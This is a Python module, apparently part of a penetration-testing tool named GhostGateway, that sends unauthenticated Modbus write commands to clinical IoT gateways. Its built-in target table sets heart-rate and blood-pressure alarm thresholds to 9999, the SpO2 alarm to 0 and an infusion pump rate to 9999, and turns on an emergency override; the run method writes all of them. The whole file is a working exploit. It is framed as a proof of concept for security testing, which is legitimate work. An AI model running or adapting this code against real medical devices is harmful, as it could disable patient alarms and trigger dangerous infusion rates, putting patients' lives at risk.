"""
GhostGateway - Modbus Injection Module
Writes arbitrary values to coils and holding registers.
Simulates unauthorized command injection on clinical IoT gateways.
"""

import socket
import struct
from utils.logger import get_logger

logger = get_logger("Modbus-Inject")

# High-risk clinical registers to target in PoC
CRITICAL_REGISTERS = {
    1: ("Alarm Threshold - Heart Rate", 9999),
    2: ("Alarm Threshold - SpO2", 0),
    3: ("Alarm Threshold - Blood Pressure", 9999),
    5: ("Infusion Pump Rate", 9999),
    7: ("Emergency Override Flag", 1),
}


class ModbusInjection:
    def __init__(self, target, port=502, unit_id=1, verbose=False):
        self.target = target
        self.port = port
        self.unit_id = unit_id
        self.verbose = verbose
        self.findings = []

    def _send_request(self, request, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.target, self.port))
            sock.send(request)
            response = sock.recv(1024)
            sock.close()
            return response
        except Exception as e:
            if self.verbose:
                logger.warning(f"Connection error: {e}")
            return None

    def write_single_register(self, register, value):
        """FC06 - Write Single Register"""
        transaction_id = 0x0001
        protocol_id = 0x0000
        length = 0x0006
        function_code = 0x06
        header = struct.pack(">HHHBB", transaction_id, protocol_id,
                             length, self.unit_id, function_code)
        data = struct.pack(">HH", register, value)
        request = header + data
        logger.info(f"[INJECT] FC06 Write Register {register} = {value}")
        resp = self._send_request(request)
        if resp and len(resp) >= 6:
            label = f"Register {register}"
            logger.info(f"  [+] SUCCESS: Wrote {value} to {label}")
            self.findings.append({
                "check": f"FC06 Write Register {register}",
                "severity": "CRITICAL",
                "detail": f"Unauthenticated write of value {value} to register {register} succeeded."
            })
            return True
        else:
            logger.warning(f"  [-] Write failed or no response for register {register}")
            return False

    def write_single_coil(self, coil, value):
        """FC05 - Write Single Coil (0xFF00=ON, 0x0000=OFF)"""
        coil_value = 0xFF00 if value else 0x0000
        transaction_id = 0x0001
        protocol_id = 0x0000
        length = 0x0006
        function_code = 0x05
        header = struct.pack(">HHHBB", transaction_id, protocol_id,
                             length, self.unit_id, function_code)
        data = struct.pack(">HH", coil, coil_value)
        request = header + data
        state = "ON" if value else "OFF"
        logger.info(f"[INJECT] FC05 Write Coil {coil} = {state}")
        resp = self._send_request(request)
        if resp and len(resp) >= 6:
            logger.info(f"  [+] SUCCESS: Coil {coil} set to {state}")
            self.findings.append({
                "check": f"FC05 Write Coil {coil}",
                "severity": "CRITICAL",
                "detail": f"Unauthenticated coil write succeeded. Coil {coil} set to {state}"
            })
            return True
        return False

    def write_multiple_registers(self, start_register, values):
        """FC16 - Write Multiple Registers"""
        count = len(values)
        byte_count = count * 2
        transaction_id = 0x0001
        protocol_id = 0x0000
        length = 7 + byte_count
        function_code = 0x10
        header = struct.pack(">HHHBB", transaction_id, protocol_id,
                             length, self.unit_id, function_code)
        data = struct.pack(">HHB", start_register, count, byte_count)
        for v in values:
            data += struct.pack(">H", v)
        request = header + data
        logger.info(f"[INJECT] FC16 Write Multiple Registers {start_register}-{start_register+count-1}")
        resp = self._send_request(request)
        if resp and len(resp) >= 6:
            logger.info(f"  [+] SUCCESS: Wrote {count} registers starting at {start_register}")
            self.findings.append({
                "check": f"FC16 Write Multiple Registers @ {start_register}",
                "severity": "CRITICAL",
                "detail": f"Unauthenticated bulk write to {count} registers. Values: {values}"
            })
            return True
        return False

    def attack_critical_registers(self):
        """Attack known high-risk clinical registers"""
        logger.info("[INJECT] Targeting critical clinical registers...")
        for reg, (label, attack_val) in CRITICAL_REGISTERS.items():
            logger.info(f"  -> Targeting [{label}] at register {reg}")
            self.write_single_register(reg, attack_val)

    def run(self, register=1, value=9999):
        logger.info("=" * 50)
        logger.info("  MODBUS INJECTION MODULE - GhostGateway")
        logger.info("=" * 50)
        # Single register write
        self.write_single_register(register, value)
        # Coil manipulation
        self.write_single_coil(7, 1)  # Emergency Override
        # Bulk write
        self.write_multiple_registers(1, [9999, 0, 9999, 9999])
        # Attack all critical registers
        self.attack_critical_registers()
        logger.info(f"[INJECT] Complete. {len(self.findings)} findings.")
        return self.findings
